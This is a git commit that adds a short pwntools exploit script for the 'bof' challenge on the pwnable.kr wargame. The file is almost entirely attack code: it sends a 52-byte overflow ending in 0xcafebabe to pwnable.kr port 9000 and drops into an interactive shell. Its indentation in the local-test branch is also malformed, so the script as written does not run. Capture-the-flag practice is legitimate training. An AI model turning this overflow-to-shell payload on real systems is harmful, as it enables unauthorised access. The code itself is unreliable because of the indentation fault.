c4da4925a7e8d10a23e5a7aecadabda4742b5aa1
Jonathan Poch <jonathan.poch@nyu.edu>
2017-07-26 16:02:25 -0400

    Added files for bof

---
+++ pwnable.kr/bof/bof.py
@@ -0,0 +1,13 @@
+from pwn import *
+
+local = False
+
+if local:
+  r = process('./bof')
+    pause()
+      r.recvuntil(': ')
+else:
+  r = remote('pwnable.kr', 9000)
+
+r.sendline("A"*52+"\xBE\xBA\xFE\xCA\x00")
+r.interactive()
